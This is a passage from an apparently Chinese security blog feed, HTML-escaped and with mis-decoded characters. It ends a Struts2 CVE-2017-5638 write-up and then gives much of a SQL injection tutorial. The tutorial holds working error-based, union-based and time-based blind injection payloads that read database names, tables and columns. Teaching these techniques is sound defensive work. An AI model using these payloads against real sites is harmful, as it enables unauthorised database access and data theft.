class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /&lt;span class=&#34;hljs-keyword&#34;&gt;opt&lt;/span&gt;/tomcat/webapps -name &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;*.jsp&amp;quot;&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;æ€»ç»“&#34;&gt;&lt;a href=&#34;#æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;æ€»ç»“&#34;&gt;&lt;/a&gt;æ€»ç»“&lt;/h2&gt;&lt;p&gt;Struts2-045æ¼æ´çš„ç‰¹ç‚¹ï¼š&lt;/p&gt;
&lt;h3 id=&#34;ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&#34;&gt;&lt;a href=&#34;#ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&#34; class=&#34;headerlink&#34; title=&#34;ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&#34;&gt;&lt;/a&gt;ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åˆ©ç”¨ç®€å•&lt;/strong&gt;: åªéœ€æ„é€ HTTPè¯·æ±‚å¤´å³å¯&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å½±å“é¢å¹¿&lt;/strong&gt;: å¤§é‡ä¼ä¸šçº§åº”ç”¨ä½¿ç”¨Struts2æ¡†æ¶&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ£€æµ‹å›°éš¾&lt;/strong&gt;: æ”»å‡»æµé‡å¯èƒ½è¢«å¿½ç•¥&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å±å®³ä¸¥é‡&lt;/strong&gt;: ç›´æ¥è·å¾—æœåŠ¡å™¨æ‰§è¡Œæƒé™&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;é˜²æŠ¤è¦ç‚¹&#34;&gt;&lt;a href=&#34;#é˜²æŠ¤è¦ç‚¹&#34; class=&#34;headerlink&#34; title=&#34;é˜²æŠ¤è¦ç‚¹&#34;&gt;&lt;/a&gt;é˜²æŠ¤è¦ç‚¹&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åŠæ—¶æ›´æ–°&lt;/strong&gt;: å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ·±åº¦é˜²å¾¡&lt;/strong&gt;: ç»“åˆWAFã€IDSç­‰å¤šå±‚é˜²æŠ¤&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›‘æ§å‘Šè­¦&lt;/strong&gt;: å»ºç«‹æœ‰æ•ˆçš„å®‰å…¨ç›‘æ§ä½“ç³»&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åº”æ€¥å“åº”&lt;/strong&gt;: åˆ¶å®šå®Œå–„çš„å®‰å…¨äº‹ä»¶å“åº”æµç¨‹&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;å…è´£å£°æ˜&lt;/strong&gt;: æœ¬æ–‡å†…å®¹ä»…ä¾›å®‰å…¨ç ”ç©¶å’Œé˜²æŠ¤å‚è€ƒï¼Œè¯·å‹¿ç”¨äºéæ³•æ”»å‡»æ´»åŠ¨ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;å‚è€ƒèµ„æº&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://struts.apache.org/announce.html#a20170307&#34;&gt;Apache Struts2å®˜æ–¹å®‰å…¨å…¬å‘Š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638&#34;&gt;CVE-2017-5638è¯¦ç»†ä¿¡æ¯&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-project-top-ten/&#34;&gt;OWASP Struts2å®‰å…¨æŒ‡å—&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="Webå®‰å…¨" />
        <category term="Struts2" />
        <category term="RCE" />
        <category term="æ¼æ´å¤ç°" />
        <category term="OGNLæ³¨å…¥" />
        <updated>2025-07-24T00:10:34.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/</id>
        <title>SQLæ³¨å…¥æ”»å‡»è¯¦è§£</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/"/>
        <content type="html">&lt;h1 id=&#34;SQLæ³¨å…¥æ”»å‡»è¯¦è§£&#34;&gt;&lt;a href=&#34;#SQLæ³¨å…¥æ”»å‡»è¯¦è§£&#34; class=&#34;headerlink&#34; title=&#34;SQLæ³¨å…¥æ”»å‡»è¯¦è§£&#34;&gt;&lt;/a&gt;SQLæ³¨å…¥æ”»å‡»è¯¦è§£&lt;/h1&gt;&lt;h2 id=&#34;å‰è¨€&#34;&gt;&lt;a href=&#34;#å‰è¨€&#34; class=&#34;headerlink&#34; title=&#34;å‰è¨€&#34;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;SQLæ³¨å…¥ä½œä¸ºWebåº”ç”¨ç¨‹åºä¸­æœ€å¸¸è§çš„å®‰å…¨æ¼æ´ä¹‹ä¸€ï¼Œè‡³ä»Šä»æ˜¯æ”»å‡»è€…åˆ©ç”¨çš„ä¸»è¦æ‰‹æ®µã€‚æœ¬æ–‡å°†è¯¦ç»†è®²è§£SQLæ³¨å…¥çš„å„ç§åˆ©ç”¨æ–¹å¼ï¼Œå¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œå¼€å‘è€…æ·±å…¥ç†è§£è¿™ä¸€ç»å…¸æ¼æ´ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ&#34;&gt;&lt;a href=&#34;#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ&#34; class=&#34;headerlink&#34; title=&#34;ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ&#34;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;SQLæ³¨å…¥ï¼ˆSQL Injectionï¼‰&lt;/strong&gt; æ˜¯ä¸€ç§å°†æ¶æ„SQLè¯­å¥æ’å…¥åŸæœ¬æ­£å¸¸æŸ¥è¯¢ä¸­çš„æ”»å‡»æ–¹å¼ã€‚æ”»å‡»è€…é€šè¿‡åœ¨ç”¨æˆ·è¾“å…¥ä¸­æ³¨å…¥ç‰¹æ®Šçš„SQLä»£ç ï¼Œå¯ä»¥æ§åˆ¶æ•°æ®åº“çš„æŸ¥è¯¢é€»è¾‘ï¼Œè¿›è€Œè¯»å–ã€ä¿®æ”¹ç”šè‡³æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ”»å‡»åŸç†&#34;&gt;&lt;a href=&#34;#æ”»å‡»åŸç†&#34; class=&#34;headerlink&#34; title=&#34;æ”»å‡»åŸç†&#34;&gt;&lt;/a&gt;æ”»å‡»åŸç†&lt;/h3&gt;&lt;p&gt;å½“Webåº”ç”¨ç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå……åˆ†éªŒè¯å’Œè¿‡æ»¤æ—¶ï¼Œæ”»å‡»è€…æäº¤çš„æ¶æ„è¾“å…¥ä¼šè¢«ç›´æ¥æ‹¼æ¥åˆ°SQLæŸ¥è¯¢è¯­å¥ä¸­ï¼Œå¯¼è‡´åŸæœ‰çš„æŸ¥è¯¢é€»è¾‘è¢«æ”¹å˜ã€‚&lt;/p&gt;
&lt;h2 id=&#34;SQLæ³¨å…¥ç±»å‹è¯¦è§£&#34;&gt;&lt;a href=&#34;#SQLæ³¨å…¥ç±»å‹è¯¦è§£&#34; class=&#34;headerlink&#34; title=&#34;SQLæ³¨å…¥ç±»å‹è¯¦è§£&#34;&gt;&lt;/a&gt;SQLæ³¨å…¥ç±»å‹è¯¦è§£&lt;/h2&gt;&lt;h3 id=&#34;1-é”™è¯¯æ³¨å…¥ï¼ˆError-based-Injectionï¼‰&#34;&gt;&lt;a href=&#34;#1-é”™è¯¯æ³¨å…¥ï¼ˆError-based-Injectionï¼‰&#34; class=&#34;headerlink&#34; title=&#34;1. é”™è¯¯æ³¨å…¥ï¼ˆError-based Injectionï¼‰&#34;&gt;&lt;/a&gt;1. é”™è¯¯æ³¨å…¥ï¼ˆError-based Injectionï¼‰&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»åŸç†&lt;/strong&gt;ï¼šé€šè¿‡æ³¨å…¥æœ‰è¯­æ³•é”™è¯¯æˆ–è¿è¡Œé”™è¯¯çš„SQLè¯­å¥ï¼Œä½¿æ•°æ®åº“æŠ›å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œä»é”™è¯¯ä¿¡æ¯ä¸­æå–å­—æ®µã€è¡¨åã€æ•°æ®åº“ç‰ˆæœ¬ç­‰æ•æ„Ÿä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ ¸å¿ƒå…³é”®å­—&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;extractvalue()&lt;/code&gt; - XMLè·¯å¾„æå–å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;updatexml()&lt;/code&gt; - XMLæ›´æ–°å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;floor(rand(0)*2)&lt;/code&gt; - éšæœºæ•°å–æ•´å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group by&lt;/code&gt; - åˆ†ç»„æŸ¥è¯¢&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ç»å…¸payloadç¤ºä¾‹&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; extractvalue(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, concat(&lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;(), &lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;))&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; updatexml(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, concat(&lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(), &lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; concat(version(), floor(rand(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)) &lt;span class=&#34;hljs-keyword&#34;&gt;having&lt;/span&gt; min(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;æŠ€æœ¯ç»†èŠ‚&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;extractvalue()&lt;/code&gt;å‡½æ•°åœ¨å‚æ•°æ ¼å¼é”™è¯¯æ—¶ä¼šæŠ›å‡ºè¯¦ç»†çš„é”™è¯¯ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x7e&lt;/code&gt;ä»£è¡¨æ³¢æµªå·&lt;code&gt;~&lt;/code&gt;ï¼Œç”¨ä½œæ•°æ®åˆ†éš”ç¬¦ä¾¿äºè¯†åˆ«&lt;/li&gt;
&lt;li&gt;é€šè¿‡æ„é€ ç‰¹å®šçš„é”™è¯¯æ¡ä»¶ï¼Œå¯ä»¥åœ¨æŠ¥é”™ä¸­æ³„éœ²æ•°æ®åº“æ•æ„Ÿä¿¡æ¯&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based-Injectionï¼‰&#34;&gt;&lt;a href=&#34;#2-è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based-Injectionï¼‰&#34; class=&#34;headerlink&#34; title=&#34;2. è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based Injectionï¼‰&#34;&gt;&lt;/a&gt;2. è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based Injectionï¼‰&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»åŸç†&lt;/strong&gt;ï¼šé€šè¿‡&lt;code&gt;union select&lt;/code&gt;è¯­å¥å°†æ”»å‡»è€…æŒ‡å®šçš„æŸ¥è¯¢ç»“æœä¸åŸå§‹æŸ¥è¯¢ç»“æœåˆå¹¶ï¼Œä»è€Œåœ¨é¡µé¢ä¸Šç›´æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„æ•æ„Ÿæ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ ¸å¿ƒå…³é”®å­—&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;union select&lt;/code&gt; - è”åˆæŸ¥è¯¢&lt;/li&gt;
&lt;li&gt;&lt;code&gt;null&lt;/code&gt; - ç©ºå€¼å ä½ç¬¦&lt;/li&gt;
&lt;li&gt;&lt;code&gt;order by&lt;/code&gt; - å­—æ®µæ’åºï¼ˆç”¨äºæ¢æµ‹åˆ—æ•°ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;code&gt;from dual&lt;/code&gt; - Oracleæ•°æ®åº“è™šæ‹Ÿè¡¨&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;æ¢æµ‹ä¸åˆ©ç”¨æµç¨‹&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ç¡®å®šå­—æ®µæ•°é‡&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;?&lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; order &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?&lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; order &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?&lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; order &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;æ„é€ è”åˆæŸ¥è¯¢&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;(),&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),version() &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;æå–æ•æ„Ÿæ•°æ®&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-built_in&#34;&gt;table_name&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.&lt;span class=&#34;hljs-keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-built_in&#34;&gt;column_name&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.&lt;span class=&#34;hljs-keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;table_name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based-Injectionï¼‰&#34;&gt;&lt;a href=&#34;#3-æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based-Injectionï¼‰&#34; class=&#34;headerlink&#34; title=&#34;3. æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based Injectionï¼‰&#34;&gt;&lt;/a&gt;3. æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based Injectionï¼‰&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»åŸç†&lt;/strong&gt;ï¼šé€šè¿‡æ‰§è¡Œæ•°æ®åº“å»¶æ—¶å‡½æ•°ï¼Œæ ¹æ®HTTPå“åº”æ—¶é—´åˆ¤æ–­æ³¨å…¥æ¡ä»¶çš„çœŸå‡ã€‚è¿™ç§æ–¹æ³•ç‰¹åˆ«é€‚ç”¨äºæ— é¡µé¢å›æ˜¾çš„ç›²æ³¨åœºæ™¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¸åŒæ•°æ®åº“çš„å»¶æ—¶å‡½æ•°&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;MySQL&lt;/strong&gt;: &lt;code&gt;sleep(x)&lt;/code&gt;, &lt;code&gt;benchmark(count, expr)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;: &lt;code&gt;pg_sleep(x)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Oracle&lt;/strong&gt;: &lt;code&gt;dbms_pipe.receive_message(&amp;#39;&amp;#39;,x)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SQL Server&lt;/strong&gt;: &lt;code&gt;waitfor delay &amp;#39;00:00:0x&amp;#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;å…¸å‹payload&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; sleep(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;, sleep(&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, benchmark(&lt;span class=&#34;hljs-number&#34;&gt;5000000&lt;/span&gt;,md5(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;test&amp;#x27;&lt;/span&gt;)), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç›²æ³¨è‡ªåŠ¨åŒ–æŠ€å·§&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# é€ä½åˆ¤æ–­æ•°æ®åº“å&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, sleep(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))&amp;lt;&lt;span class=&#34;hljs-number&#34;&gt;122&lt;/span&gt;, sleep(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

